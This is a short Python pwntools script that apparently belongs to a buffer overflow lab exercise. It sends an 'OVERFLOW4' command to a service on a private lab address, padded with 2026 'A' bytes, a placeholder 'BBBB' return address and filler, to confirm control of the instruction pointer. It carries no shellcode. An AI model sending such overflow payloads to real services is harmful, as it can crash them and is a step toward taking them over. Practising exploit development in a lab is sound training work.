#!/usr/bin/env python3

from pwn import *

host = "10.10.129.151"
port = 1337

s = remote(host, port)
total_length = 3000
offset = 2026
new_eip = b"BBBB"


payload = [
    b"OVERFLOW4 ",
    b"A" * offset,
    new_eip,
    b"C" * (total_length - offset - len(new_eip))
]

payload = b"".join(payload)
s.send(payload)
s.close()